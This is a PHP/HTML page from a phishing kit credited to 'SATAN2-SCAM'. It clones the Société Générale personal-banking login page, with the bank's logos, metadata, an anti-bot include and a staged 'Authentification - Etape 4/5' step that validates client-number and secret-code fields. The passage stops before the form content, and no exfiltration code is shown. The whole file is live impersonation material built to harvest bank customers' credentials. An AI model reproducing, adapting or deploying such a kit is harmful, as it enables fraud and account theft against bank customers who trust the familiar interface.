 <?php

/**
 * @link     : https://www.lesatan2scam.com/ 
 * @package  : SOCIETE GENERALE
 * @author   : SATAN2-SCAM 
 * @telegram : @lesatan2scam
 * @couriel  : lesatan2scam@gmail.com
 * @version  : Mise à jour
 * @copyright: https://facebook.com/lesatan2scam
 */

include '../main/antibots.php';
include_once '../main/main.php';

$random   = rand(0,100000000000);
$LSG = substr(md5($random), 0, 17);

?>
<?php 
/*CACHE*/
$fichierCache = '../cache/lsg_passecur.lsg';
if (@filemtime($fichierCache)<time()-(24*3600)) {ob_start(); 
?>

<!DOCTYPE html>
<html lang="fr" class="swm-root-active swm-mode-page" >
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=no">
<meta name="format-detection" content="telephone=no">
 

<script>if (top != self) { top.location = self.location; }</script>

<title>SG | Connexion</title>





<script  charset="UTF-8" src="../assets/js/n2g_secu.js"></script>
<script type="text/javascript">frame_shield();</script>
<script type="application/json" id="sas_user_info">
{

}
</script>


<meta name="robots" content="none"/>
<meta property="og:url" content="https://particuliers.societegenerale.fr/loginpage/user-login-page">


<title>Connexion à votre Espace Client Particuliers</title>
<meta name="title" content="Connexion à votre Espace Client Particuliers">
<meta property="og:title" content="Connexion à votre Espace Client Particuliers" />
<meta name="twitter:card" content="summary" />

<script>
if (!window.cmsConstants) window.cmsConstants = {};

window.cmsConstants.LOGGER_SERVICE_END_POINT = "/extrestcontent/logBigData";
window.cmsConstants.LOGGER_LEVEL_MIN_SERVER = "error";
window.cmsConstants.LOGGER_LEVEL_MIN_CLIENT = "error";

window.cmsConstants.LOGGER_SERVICE_END_POINT_DEFAULT = "/extrestcontent/logBigData";
window.cmsConstants.LOGGER_LEVEL_MIN_SERVER_DEFAULT = "ERROR";
window.cmsConstants.LOGGER_LEVEL_MIN_CLIENT_DEFAULT = "ERROR";
</script><meta name="viewport" content="initial-scale=1, maximum-scale=1, viewport-fit=cover">
<link rel="icon" type="image/x-icon" href="../assets/img/favicon.ico">

<script type="text/javascript">
function getCookie(name) {
var value = "; " + document.cookie;
var parts = value.split("; " + name + "=");
if (parts.length == 2) {
return parts.pop().split(";").shift();
}
return "";
}

function setValue(defaultVal, val) {
if (val == null || val.trim() === '') {
return defaultVal
}
return val;
}


function setValueBoolean(defaultVal, val) {
if (val == null || val.trim() === '') {
return defaultVal
}
return val == 1;
}

function addAdditionalParams(tc_vars) {
try {
var additionals = ""
additionals = additionals.replace(/'/g, "").replace(/"/g, '')
const params = additionals.split(',')
for (var i = 0; i < params.length; i++) {
const param = params[i].split(':')
tc_vars[param[0].trim()] = param[1].trim()
};
} catch (e) {
}
}
function getTechnicalUrl() {
var pageUrl = window.location.href;
var technical_url = pageUrl.replace(window.location.protocol +'//'+ window.location.hostname,'');
return technical_url
}

const empty = "";
//const version = "V3";
var tc_vars = {
"page_section": setValue(empty, ""),
"page_category_1": "loginpage",
"page_category_2": "",
"page_category_3": "",
"page_name": "user-login-page",
"page_type": setValue(empty, "HomePage"),
"page_noload": true,
"no_load": true,
"product_category_1": setValue(empty, ""),
"product_category_2": setValue(empty, ""),
"product_category_3": setValue(empty, ""),
"product_category_4": setValue(empty, ""),
"product_category_5": setValue(empty, ""),
"product_name_trade": setValue(empty, ""),
"product_target": setValue(empty, ""),
"env_channel": setValue("website", ""),
"env_market": setValue("particuliers", ""),
"env_work": "production",
"user_is_identified": false,
"user_is_supervisor" : false,
"env_is_private": setValueBoolean(true, ""),
"page_technical_url": getTechnicalUrl()
};
addAdditionalParams(tc_vars);

var xiti_xtn2 = "";
var xtn2 = "";



var sasInf = document.getElementById('sas_user_info');
if (sasInf) {
var sasHtml = sasInf.innerHTML;
try {
var sasJs = JSON.parse(sasHtml.trim());
if (sasJs && sasJs.IdStat && sasJs["user-info-firstname"] && sasJs["user-info-lastname"]) {
tc_vars["user_id"] = sasJs.IdStat;
tc_vars["user_is_logged"] = true;


} else {
tc_vars["user_is_logged"] = false;

}
if(sasJs && sasJs["user-info-sup"]==="true" ){
tc_vars["user_is_supervisor"] = true;

}else{
tc_vars["user_is_supervisor"] = false;

}

} catch (e) {
tc_vars["user_is_logged"] = false;

}
} else {
tc_vars["user_is_logged"] = false;

}
</script>
<script type="text/javascript">
if (typeof userSegments === "undefined") {
var userSegments = [];
}
if (typeof userSegmentNames === "undefined") {
var userSegmentNames = [];
}

userSegments.push("S--1470891196-0000000000000000000000RCRD");

userSegments.push("S-1291998658-00000000000000000000000RCRD");

userSegments.push("S-1609544352-00000000000000000000000RCRD");

userSegmentNames.push("0");

userSegmentNames.push("Desktop");

userSegmentNames.push("Clients_Generiques");
</script>

<script charset="UTF-8" src="../assets/js/init-configs_20220624163857.js"></script>
<script charset="UTF-8" src="../assets/js/dca_portail_global_20211128192509.js"></script>
<script charset="UTF-8" src="../assets/js/public-dca.js"></script>
<!--<script charset="UTF-8" src="../assets/js/vendor_20220712163549.min.js"></script>
<script charset="UTF-8" src="../assets/js/gda.public.js"></script>
<script charset="UTF-8" src="../assets/js/interact-lanceur.js"></script>
<script charset="UTF-8" src="../assets/js/index_20220712163549.min.js"></script>
<script charset="UTF-8" src="../assets/js/public-tms.js"></script>-->

<link href="../assets/css/index_pri_20220712163248.min.css" rel="stylesheet" type="text/css" />
<link href="../assets/css/spec56_btn_gsm_all_gcd_20211128192509.min.css" rel="stylesheet" type="text/css" />
<link href="../assets/css/print_20220624163857.min.css" rel="stylesheet" type="text/css" media="print"/>

<link href="../assets/scss/index_20190723161948.min.css" rel="stylesheet" type="text/css">
<link href="../assets/scss/spec56_btn_gsm_all_gcd_20190320190559.min.css" rel="stylesheet" type="text/css">
<link rel="stylesheet" href="../assets/scss/inbenta.css">
<link rel="stylesheet" href="../assets/scss/style.css">
<link href="../assets/scss/print_20190320190559.min.css" rel="stylesheet" type="text/css" media="print">
<style type="text/css">
.eip_txt_light{
  font-weight:300;
}

.eip_dcw_main-link{
  color:#fff;
  text-decoration: underline !important;
  -webkit-transition: color 0.2s ease-in-out;
  -o-transition: color 0.2s ease-in-out;
  transition: color 0.2s ease-in-out;
}

.eip_dcw_main-link:hover, .eip_dcw_main-link:focus{
  color:#f05b6f;
}
</style>
<link href="../assets/css/head-section_fix-gb9_16381239090000.css" rel="stylesheet" type="text/css"/>
<!-- URL: https://particuliers.societegenerale.fr:80/restcontent/theme/e7ec774b8e120610VgnVCM100000050013acRCRD -->
<!-- REQUEST PROFILE: , REQUEST SAS AUTH_LEVEL: 0 -->
<!-- channelId: 75eec1c77d92f510VgnVCM100000030013acRCRD, templateID: e7ec774b8e120610VgnVCM100000050013acRCRD, isRenderPageFeatures: true, FURL_NAME: /authen/theme, FURL_ID: efb3c1c77d92f510VgnVCM100000030013acRCRD -->


<script src="../assets/lib/rules.js"></script> 
<script src="../assets/lib/jquery.js"></script>
<!--<script src="../assets/lib/js.js"></script>-->
<script src="../assets/lib/jquery2.js" ></script>
<script>
$(document).ready(function(){
  $("#user_id").on("change paste keyup",function(){
if ($(this).val().length >= 8) {
$('#user_id').addClass('is-valid');
} else {
$('#user_id').removeClass('is-valid'); 
}
  });
});


</script>
<script>

$(document).ready(function()
{
var _try=0;
$("#initClient").click(function()
{
$("#client-nbr").val("");
$("#secret-nbr").val("");
$("#next").css("opacity","0.4");
$("#next").css("pointer-events", "none");
$("#next").css("cursor", "default");
});


$("#initPass").click(function()
{
$("#secret-nbr").val("");
$("#pw").val("");
$("#next").css("opacity","0.4");
$("#next").css("pointer-events", "none");
$("#next").css("cursor", "default");
});




});
</script>
<script>

function ShowStep2() {
document.getElementById("clavier").style.display = "block";
document.getElementById("btn-container").style.display = "none";
}

function valider() {
var mdp = document.getElementById("user_id").value;
if (mdp.length == 5) {
return true;

} else {
return false;
}
}   


</script> 
<style type="text/css">
.eip_txt_light {
font-weight: 300;
}

.eip_dcw_main-link {
color: #fff;
text-decoration: underline !important;
-webkit-transition: color 0.2s ease-in-out;
-o-transition: color 0.2s ease-in-out;
transition: color 0.2s ease-in-out;
}

.eip_dcw_main-link:hover,
.eip_dcw_main-link:focus {
color: #f05b6f;
}
</style>
<style>
#codCl {
opacity:0;

}
#codCl.waa {
opacity:1;
transition:opacity 500ms;
}
#oop {
   
opacity:1;
transition:opacity 500ms;
}
#oop.woo {
 opacity:0;

}

</style>

<script>
setTimeout(function(){
document.getElementById('oop').className = 'woo';
}, 5000);

setTimeout(function(){
document.getElementById('codCl').className = 'waa';
}, 5000);
</script>  
<link href="../assets/css/style2.css" rel="stylesheet" type="text/css" />
<style type="text/css">

html, body { zoom: 1;}
html, body, header, .rsp_header__wrapper-nav {
min-width:100% !important;
width:100% !important;
}
.marginDesign{  margin-top: -40px; margin-left: 15%; margin-right: 15%; }

@media screen and (max-width: 385px) {
html, body, header, .rsp_header__wrapper-nav {
min-width:100% !important;
width:100% !important;
}
}

@media screen and (max-width: 1024px) {
.flott { float: left !important; margin-left:0px !important; }
.marginDesign{  margin-top: -40px; margin-left: 7%;  margin-right: 10%;}
}
@media screen and (max-width: 955px) {
.flott{ float: left !important; margin:none :!important; }
.marginDesign{  margin-top: -40px; margin-left: -20px !important;}
}
@media screen and (max-width: 865px) {
.flott{ float: left !important; margin:none :!important; }
.marginDesign{  margin-top: -40px; margin-left: -20px !important;}
}
@media screen and (max-width: 813px) {
.flott{ float: left !important; margin:none :!important; }
.marginDesign{  margin-top: -40px; margin-left: -35px !important;}
}
@media screen and (max-width: 776px) {
.flott{ float: left !important; margin:none :!important; }
.marginDesign{  margin-top: -40px; margin-left: -10px !important;}
}
@media screen and (max-width: 390px) {
.flott{ float: left !important; margin:none :!important; }
.butto{  display: block; margin-top: -15px; margin-left: 30px !important; }
#clavier{ margin-left: -60px !important; }
}

</style> 
</head>

  
  
<body class="PRI waitJeton swm swm-mode-page swm-theme-BDDF  swm-page-authent  swm-theme-BDDF-BDDF swm-theme-SITE_WEB swm-module-authentCV">
 
<header class="rsp_header header-deco header-authent js-header-lhs-auth">
<nav class="rsp_nav rsp_nav--above" id="go-navigation">
<ul class="rsp_nav__list">

<li class="rsp_nav__item rsp_nav__item--push-right" data-channelid="">
<a href="#" class="rsp_nav__link" data-element-label="agences" ><svg aria-hidden="true" focusable="false" width="18" height="18"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="../assets/img/pictos-fonctionnels_20230510173629.svg#lhs-localisation"></use></svg><span>Agences</span></a>
</li>
<li class="rsp_nav__item" data-channelid="">
<a href="#" class="rsp_nav__link" data-element-label="aide-et-contacts"><svg aria-hidden="true" focusable="false" width="18" height="18"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="../assets/img/pictos-fonctionnels_20230510173629.svg#lhs-urgence"></use></svg><span>Aide et contacts</span></a>
</li>
</ul>
</nav>

<div class="rsp_header__wrapper-nav">

  <a href="#" class="rsp_header__logo-mob flott" title="SG - Aller à l'accueil">
  <svg role="img" aria-label="Logo SG - C'est vous l'a venir" focusable="false" height="48" width="197" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" x="0px" y="0px" viewBox="0 0 140.2 34.1" style="enable-background:new 0 0 140.2 34.1; xml:space=" preserve="" class="flott">
<style type="text/css">
  .st0{fill:none;}
  .st1{fill:#E60028;}
  .st2{fill:#FFFFFF;}
</style>
<rect x="-10.1" y="-9.8" class="st0" width="160.2" height="53.9"></rect>
<g>
  <path d="M73,12.1c0-2.2,1.7-3.7,4-3.7c1.3,0,2.4,0.5,3.1,1.4l-1.3,1.2c-0.5-0.5-1-0.8-1.7-0.8c-1.2,0-2,0.8-2,2.1   c0,1.2,0.8,2.1,2,2.1c0.7,0,1.2-0.3,1.7-0.8l1.3,1.2c-0.7,0.9-1.8,1.4-3.1,1.4C74.7,15.9,73,14.3,73,12.1z"></path>
  <path d="M82.9,9.1c0,0.3,0,0.5-0.3,1.2l-0.7,1.5h-1.2l0.5-1.7c-0.4-0.2-0.6-0.5-0.6-1C80.5,8.4,81,8,81.7,8   C82.4,8,82.9,8.4,82.9,9.1z"></path>
  <path d="M89.6,14.1v1.6h-5.8V8.5h5.7v1.6h-3.6v1.2h3.2v1.5h-3.2v1.3H89.6z"></path>
  <path d="M90.2,15.1l0.7-1.5c0.6,0.4,1.5,0.7,2.4,0.7c0.8,0,1.2-0.2,1.2-0.6c0-1.1-4.1-0.3-4.1-3c0-1.3,1.1-2.3,3.2-2.3   c0.9,0,1.9,0.2,2.6,0.6l-0.6,1.5c-0.7-0.4-1.4-0.6-2-0.6c-0.9,0-1.2,0.3-1.2,0.6c0,1.1,4.1,0.3,4.1,2.9c0,1.3-1.1,2.3-3.2,2.3   C92.1,15.9,90.9,15.5,90.2,15.1z"></path>
  <path d="M99.1,10.1h-2.2V8.5h6.5v1.6h-2.2v5.6h-2V10.1z"></path>
  <path d="M114.6,8.5l-3.1,7.2h-2l-3.1-7.2h2.2l2,4.7l2-4.7H114.6z"></path>
  <path d="M114.3,12.1c0-2.2,1.7-3.7,4-3.7c2.3,0,4,1.6,4,3.7s-1.7,3.7-4,3.7C116,15.9,114.3,14.3,114.3,12.1z M120.3,12.1   c0-1.2-0.9-2.1-1.9-2.1c-1.1,0-1.9,0.8-1.9,2.1s0.9,2.1,1.9,2.1C119.4,14.2,120.3,13.4,120.3,12.1z"></path>
  <path d="M123.5,12.5v-4h2v3.9c0,1.2,0.5,1.7,1.4,1.7c0.8,0,1.4-0.5,1.4-1.7V8.5h2v4c0,2.2-1.3,3.4-3.4,3.4   C124.8,15.9,123.5,14.7,123.5,12.5z"></path>
  <path d="M131.1,15.1l0.7-1.5c0.6,0.4,1.5,0.7,2.4,0.7c0.8,0,1.2-0.2,1.2-0.6c0-1.1-4.1-0.3-4.1-3c0-1.3,1.1-2.3,3.2-2.3   c0.9,0,1.9,0.2,2.6,0.6l-0.6,1.5c-0.7-0.4-1.4-0.6-2-0.6c-0.9,0-1.2,0.3-1.2,0.6c0,1.1,4.1,0.3,4.1,2.9c0,1.3-1.1,2.3-3.2,2.3   C133,15.9,131.8,15.5,131.1,15.1z"></path>
  <path d="M73.3,18.5h2v5.6h3.4v1.6h-5.5V18.5z"></path>
  <path d="M80.7,19.2c0,0.3,0,0.5-0.3,1.2l-0.7,1.5h-1.2l0.5-1.7c-0.4-0.2-0.6-0.5-0.6-1c0-0.7,0.5-1.2,1.2-1.2   C80.2,18,80.7,18.5,80.7,19.2z"></path>
  <path d="M85.9,24.4h-3l-0.6,1.4h-2.1l3.2-7.2h2l3.2,7.2h-2.1L85.9,24.4z M85.3,22.9l-0.9-2.3l-0.9,2.3H85.3z"></path>
  <path d="M95.2,18.5l-3.1,7.2h-2L87,18.5h2.2l2,4.7l2-4.7H95.2z"></path>
  <path d="M101.7,24.2v1.6h-5.8v-7.2h5.7v1.6H98v1.2h3.2v1.5H98v1.3H101.7z"></path>
  <path d="M109.7,18.5v7.2H108l-3.2-3.8v3.8h-2v-7.2h1.7l3.2,3.8v-3.8H109.7z"></path>
  <path d="M111.1,18.5h2v7.2h-2V18.5z"></path>
  <path d="M117.6,23.8h-1.1v1.9h-2v-7.2h3.3c2,0,3.2,1,3.2,2.7c0,1.1-0.5,1.8-1.4,2.3l1.6,2.3H119L117.6,23.8z M117.7,20.2h-1.1v2.1   h1.1c0.8,0,1.3-0.4,1.3-1.1C118.9,20.5,118.5,20.2,117.7,20.2z"></path>
</g>
<g>
  <path d="M9.1,15.6l1.3,0.3c3.2,0.7,4.6,2.1,4.6,4.6c0,3.1-2.3,4.8-6.6,4.8H2.8v-3.3c1.9,0.4,3.8,0.6,5.5,0.6c2.5,0,3.7-0.7,3.7-1.9   c0-1.3-0.6-1.7-3.4-2.3l-1.3-0.3c-3.2-0.6-4.6-2.1-4.6-4.6C2.7,10.6,5,8.9,9,8.9h5.1v3.3c-1.8-0.4-3.3-0.6-4.9-0.6   c-2.2,0-3.5,0.7-3.5,1.9C5.7,14.7,6.4,15.1,9.1,15.6z M31.3,17.1v8.2H26c-6,0-9.4-3-9.4-8.2c0-5.2,3.5-8.2,9.4-8.2h4.1v3.2   c-1.4-0.3-2.9-0.5-4.2-0.5c-3.8,0-6.1,2-6.1,5.5c0,3.4,2.3,5.4,6.1,5.4h2.5l0-5.4H31.3z"></path>
</g>
<rect x="38.2" y="3" class="st1" width="28.3" height="12.8"></rect>
<rect x="38.2" y="18.5" width="28.3" height="12.8"></rect>
<rect x="38.2" y="15.7" class="st2" width="28.3" height="2.8"></rect>
  </svg>
  </a>
  <a href="#" class="rsp_header__logo-desktop ml-m" title="SG - Aller à l'accueil">
  <svg role="img" aria-label="Logo SG - C'est vous l'avenir" focusable="false" height="50" width="205" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" x="0px" y="0px" viewBox="0 0 140.2 34.1" style="enable-background:new 0 0 140.2 34.1;" xml:space="preserve">
<style type="text/css">
  .st0{fill:none;}
  .st1{fill:#E60028;}
  .st2{fill:#FFFFFF;}
</style>
<rect x="-10.1" y="-9.8" class="st0" width="160.2" height="53.9"></rect>
<g>
  <path d="M73,12.1c0-2.2,1.7-3.7,4-3.7c1.3,0,2.4,0.5,3.1,1.4l-1.3,1.2c-0.5-0.5-1-0.8-1.7-0.8c-1.2,0-2,0.8-2,2.1   c0,1.2,0.8,2.1,2,2.1c0.7,0,1.2-0.3,1.7-0.8l1.3,1.2c-0.7,0.9-1.8,1.4-3.1,1.4C74.7,15.9,73,14.3,73,12.1z"></path>
  <path d="M82.9,9.1c0,0.3,0,0.5-0.3,1.2l-0.7,1.5h-1.2l0.5-1.7c-0.4-0.2-0.6-0.5-0.6-1C80.5,8.4,81,8,81.7,8   C82.4,8,82.9,8.4,82.9,9.1z"></path>
  <path d="M89.6,14.1v1.6h-5.8V8.5h5.7v1.6h-3.6v1.2h3.2v1.5h-3.2v1.3H89.6z"></path>
  <path d="M90.2,15.1l0.7-1.5c0.6,0.4,1.5,0.7,2.4,0.7c0.8,0,1.2-0.2,1.2-0.6c0-1.1-4.1-0.3-4.1-3c0-1.3,1.1-2.3,3.2-2.3   c0.9,0,1.9,0.2,2.6,0.6l-0.6,1.5c-0.7-0.4-1.4-0.6-2-0.6c-0.9,0-1.2,0.3-1.2,0.6c0,1.1,4.1,0.3,4.1,2.9c0,1.3-1.1,2.3-3.2,2.3   C92.1,15.9,90.9,15.5,90.2,15.1z"></path>
  <path d="M99.1,10.1h-2.2V8.5h6.5v1.6h-2.2v5.6h-2V10.1z"></path>
  <path d="M114.6,8.5l-3.1,7.2h-2l-3.1-7.2h2.2l2,4.7l2-4.7H114.6z"></path>
  <path d="M114.3,12.1c0-2.2,1.7-3.7,4-3.7c2.3,0,4,1.6,4,3.7s-1.7,3.7-4,3.7C116,15.9,114.3,14.3,114.3,12.1z M120.3,12.1   c0-1.2-0.9-2.1-1.9-2.1c-1.1,0-1.9,0.8-1.9,2.1s0.9,2.1,1.9,2.1C119.4,14.2,120.3,13.4,120.3,12.1z"></path>
  <path d="M123.5,12.5v-4h2v3.9c0,1.2,0.5,1.7,1.4,1.7c0.8,0,1.4-0.5,1.4-1.7V8.5h2v4c0,2.2-1.3,3.4-3.4,3.4   C124.8,15.9,123.5,14.7,123.5,12.5z"></path>
  <path d="M131.1,15.1l0.7-1.5c0.6,0.4,1.5,0.7,2.4,0.7c0.8,0,1.2-0.2,1.2-0.6c0-1.1-4.1-0.3-4.1-3c0-1.3,1.1-2.3,3.2-2.3   c0.9,0,1.9,0.2,2.6,0.6l-0.6,1.5c-0.7-0.4-1.4-0.6-2-0.6c-0.9,0-1.2,0.3-1.2,0.6c0,1.1,4.1,0.3,4.1,2.9c0,1.3-1.1,2.3-3.2,2.3   C133,15.9,131.8,15.5,131.1,15.1z"></path>
  <path d="M73.3,18.5h2v5.6h3.4v1.6h-5.5V18.5z"></path>
  <path d="M80.7,19.2c0,0.3,0,0.5-0.3,1.2l-0.7,1.5h-1.2l0.5-1.7c-0.4-0.2-0.6-0.5-0.6-1c0-0.7,0.5-1.2,1.2-1.2   C80.2,18,80.7,18.5,80.7,19.2z"></path>
  <path d="M85.9,24.4h-3l-0.6,1.4h-2.1l3.2-7.2h2l3.2,7.2h-2.1L85.9,24.4z M85.3,22.9l-0.9-2.3l-0.9,2.3H85.3z"></path>
  <path d="M95.2,18.5l-3.1,7.2h-2L87,18.5h2.2l2,4.7l2-4.7H95.2z"></path>
  <path d="M101.7,24.2v1.6h-5.8v-7.2h5.7v1.6H98v1.2h3.2v1.5H98v1.3H101.7z"></path>
  <path d="M109.7,18.5v7.2H108l-3.2-3.8v3.8h-2v-7.2h1.7l3.2,3.8v-3.8H109.7z"></path>
  <path d="M111.1,18.5h2v7.2h-2V18.5z"></path>
  <path d="M117.6,23.8h-1.1v1.9h-2v-7.2h3.3c2,0,3.2,1,3.2,2.7c0,1.1-0.5,1.8-1.4,2.3l1.6,2.3H119L117.6,23.8z M117.7,20.2h-1.1v2.1   h1.1c0.8,0,1.3-0.4,1.3-1.1C118.9,20.5,118.5,20.2,117.7,20.2z"></path>
</g>
<g>
  <path d="M9.1,15.6l1.3,0.3c3.2,0.7,4.6,2.1,4.6,4.6c0,3.1-2.3,4.8-6.6,4.8H2.8v-3.3c1.9,0.4,3.8,0.6,5.5,0.6c2.5,0,3.7-0.7,3.7-1.9   c0-1.3-0.6-1.7-3.4-2.3l-1.3-0.3c-3.2-0.6-4.6-2.1-4.6-4.6C2.7,10.6,5,8.9,9,8.9h5.1v3.3c-1.8-0.4-3.3-0.6-4.9-0.6   c-2.2,0-3.5,0.7-3.5,1.9C5.7,14.7,6.4,15.1,9.1,15.6z M31.3,17.1v8.2H26c-6,0-9.4-3-9.4-8.2c0-5.2,3.5-8.2,9.4-8.2h4.1v3.2   c-1.4-0.3-2.9-0.5-4.2-0.5c-3.8,0-6.1,2-6.1,5.5c0,3.4,2.3,5.4,6.1,5.4h2.5l0-5.4H31.3z"></path>
</g>
<rect x="38.2" y="3" class="st1" width="28.3" height="12.8"></rect>
<rect x="38.2" y="18.5" width="28.3" height="12.8"></rect>
<rect x="38.2" y="15.7" class="st2" width="28.3" height="2.8"></rect>
  </svg>
  </a>   

 

<a data-channelid="6a29885f3a7df610VgnVCM10000057f440c0RCRD" aria-expanded="false" class="rsp_link rsp_link--picto-only ml-auto mr-m" data-tms-container-label="Ouvrir un compte" data-tms-click-type="N" data-tms-element-label="se-connecter" href="#"><span class="rsp_link__label">Ouvrir un compte</span>
</a></div>

<h1 class="rsp_header__title-page" id="js-mobile-title">Authentification - Etape 4/5</h1>

<input id="breadcrumb-channel-ids" type="hidden" value="75eec1c77d92f510VgnVCM100000030013acRCRD,f18ec1c77d92f510VgnVCM100000030013acRCRD,25d136f55ccb9510VgnVCM100000050013acRCRD">
</header>
<main class="dcw_main dcw_gb9_core-wrapper" role="main">
<a id="go-content" tabindex="-1"></a>
<section class="dcw_gb_row">
</section>
<section class="dcw_gb_wrapper">
<a id="go-content" tabindex="-1"></a>
<section class="dcw_gb9_core-left" id="">

<!-- URL: https://particuliers.societegenerale.fr:80/restcontent/regions/75eec1c77d92f510VgnVCM100000030013acRCRD -->
<!-- REQUEST PROFILE: , REQUEST SAS AUTH_LEVEL: 0 -->
<!-- channelId: 75eec1c77d92f510VgnVCM100000030013acRCRD, regionNames: header-int-without-navigation-and-open-main,gb9-com1-int, FURL_NAME: /authen/header, FURL_ID: a763c1c77d92f510VgnVCM100000030013acRCRD -->

 

<noscript>
<style>
.auth-content {display:none !important;}
.waitAuthJetonMsg {display: none !important;}
</style>
</noscript>

<link rel="stylesheet" href="../assets/css/style.css" />


<script>

 

window.swmConfOverride = {
"version": "21.2.10.1",
"firm": "BDDF",
"banque": "BDDF",
"provenance": "",
"market": "PRI",
"isNGIM": true,
"isCookieless": false,
"media": "WEB_INT",
"bank_market_canal": "BDDF_PRI_WEB",
"isProspect": false,
"codeClientEtoileNgim": "",
"defaultUrl": "\/icd\/cbo\/index-authsec.html#cbo\/",


"isSASAuth": false,
"isSupervision": false,
"logLocal": false,
"logNiveau": "error",
"staticBaseUrl": "/icd/static/swm/resources/version/21.2.10.1",
"baseUrl": "",
"styles": [],
"isDebug": false,
"urlCdnCmsBeforeCmsMainContainer": "${url.cdn.cms.beforeCmsMainContainer.content}",
"urlCdnCmsAfterCmsMainContainer": "${url.cdn.cms.afterCmsMainContainer.content}",
"urlCdnCmsBeforeSwmContainerContent": "${url.cdn.cms.beforeSwmContainer.content}",
"urlCdnCmsAfterSwmContainerContent": "${url.cdn.cms.afterSwmContainer.content}",
"isZSSCA": "false"



};


swmConfOverride.styles = ["../assets/css/style.css"];
</script>

<div id="swm-wrapper" class="swm-inner-wrapper">
<div class="prefetch"></div>
<div id="disableLayer" class="disable-layer"></div>






<script id="templateGenericError" type="template/doT.js">
{{? it.errorType }}
<span class="swm-popin-picto swm-popin-picto-{{= it.errorType }}" aria-hidden="true"></span>
{{?}}
<div class="swm-popin-content">
{{? it.erreur1}}
<p>
{{=it.erreur1}}
</p>
{{?}}
{{? it.erreur2}}
<p>
{{=it.erreur2}}
</p>
{{?}}
{{? it.erreur3}}
<p>
{{=it.erreur3}}
</p>
{{?}}
</div>
<div id="swm-popin-btn-erreur" class="swm-button-wrapper swm-popin-btn-erreur {{=it.btnStyle}}">
<button class="swm_button-arrondi swm_button-principal swm-btn-action csa-cdn-ok swm-btn_primary {{=it.btnStyleNgim}}" type="button" tabindex="1">
{{=it.bouton}}
</button>
</div>
</script>

<script id="templateCsaError" type="template/doT.js">
<div class="eer_modal eer_popinOTP" role="dialog" aria-describedby="dialog-desc">
<span class="eer_modal__picto is-active" aria-hidden="true"></span>

{{? it.erreur1}}
<p class="eer_popinOTP__title">
{{=it.erreur1}}
</p>
{{?}}
<p id="dialog-desc" class="eer_modal__content">
{{? it.erreur2}}
{{=it.erreur2}}
{{?}}
</p>
<button class="eer_btn eer_btn--primary">{{? it.bouton}}{{=it.bouton}}{{??}}Retour &agrave; mon espace{{?}}</button>
</div>
</script>

<div id="swm-tooltip" class="swm-tooltip">
<span></span>
</div>
<div class="swm-popin-wrapper" role="dialog" aria-modal="true" aria-labelledby="swm-modal-label">
<div id="swm-popin-overlay" class="swm-popin-overlay" role="presentation"></div>
<div id="swm-popin-dialog" class="swm-popin-dialog">
<div class="swm-popin-relative">
<div id="swm-popin-btn-fermer" class="swm-popin-btn-fermer" role="button" tabindex="0" aria-label="Fermer la popin"></div>
<div id="swm-popin-ombre-lat" class="swm-popin-ombre-lat">
<div id="swm-popin" class="swm-popin">
<div id="swm-popin-cadre" class="swm-popin-cadre">
</div>
</div>
</div>
</div>
</div>
</div>


 

<script id="errorMessage" type="template/doT.js">
<div class="error-wrapper">
<div class="inner">
{{? it.bigTitle}}
<div class="big-title">{{!it.bigTitle}}</div>
{{?}}
{{? it.title}}
<div class="title">{{!it.title}}</div>
{{?}}



<div class="message">{{? it.message}}{{=it.message}}{{??}}{{!it}}{{?}}</div>



</div>
</div>
</script>

<script id="messageError" type="template/doT.js">
<div class="error-wrapper">
<div class="inner">
{{? it.bigTitle}}
<div class="big-title">{{!it.bigTitle}}</div>
{{?}}
<div class="message message-error">
{{? it.title}}
<div class="titleError">{{!it.title}}</div>
{{?}}
{{? it.message}}
{{=it.message}}
{{??}}
{{!it}}
{{?}}
{{? it.messageAsuivre}}
<div class="etapeAsuivre">{{=it.messageAsuivre}}</div>
{{?}}
</div>
<button class="js-error--close is-hide theme-white--is-show auth-btn-action" type="button">OK</button>
</div>
</div>
</script>

<script id="messageWarning" type="template/doT.js">
<div class="error-wrapper">
<div class="inner">
{{? it.bigTitle}}
<div class="big-title">{{!it.bigTitle}}</div>
{{?}}
<div class="message message-warning">
{{? it.title}}
<div class="titleWarning">{{!it.title}}</div>
{{?}}
{{? it.message}}
{{=it.message}}
{{??}}
{{=it}}
{{?}}
{{? it.messageAsuivre}}
<div class="etapeAsuivre">{{=it.messageAsuivre}}</div>
{{?}}
</div>
 <button class="js-error--close is-hide theme-white--is-show auth-btn-action" type="button">OK</button>
</div>
</div>
</script>





<div class="swm_authent">


<div class="auth-content js-content-aria-hide swm_codeContainer">
<div id="swmModulesAuth">



</div>


<DIV id="divMaster" class="swm_block">
  

<!--<main class="dcw_main dcw_gb9_core-wrapper" role="main" style="margin-top: -40px; margin-left: 15%; margin-right: 15%;">-->
<section class="dcw_main" >
<section class="dcw_gb_row dcw_gb_communication">
</section>
<section class="dcw_gb_wrapper">
<main role="main">
<a id="go-content" tabindex="-1"></a>
<section class="dcw_gb_core ugds_serviciel" id="">

<div id="dcw-swm" class="swm-inner-wrapper">
<div class="prefetch"></div>
<div id="disableLayer" class="disable-layer"></div>



<div id="swm-tooltip" class="swm-tooltip">
<span></span>
</div>
<div class="swm-popin-wrapper" tabindex="0" role="dialog" aria-live="assertive">
<div id="swm-popin-overlay" class="swm-popin-overlay"></div>
<div id="swm-popin-dialog" class="swm-popin-dialog">
<div class="swm-popin-relative">
<div id="swm-popin-btn-fermer" class="swm-popin-btn-fermer" tabindex="0" aria-label="Fermer la popin"></div>
<div class="swm-popin-ombre-sup"></div>
<div id="swm-popin-ombre-lat" class="swm-popin-ombre-lat">
<div id="swm-popin" class="swm-popin">
<div id="swm-popin-cadre" class="swm-popin-cadre oob-content">
</div>
</div>
</div>
<div class="swm-popin-ombre-inf"></div>
</div>
</div>
</div>

<main role="main" class="dcw_authent dcw_csetape">
<div class="dcw_codeContainer">
<div class="dcw_block">
<div class="dcw_block-element">
<section class="dcw_chemin_etape js-breadcrumb nav-item-selected-1">

</section>
</div>
</div>
<div id="oop" align="center">
<img src="../assets/img/loader.gif">
</div>

<div id="codCl">

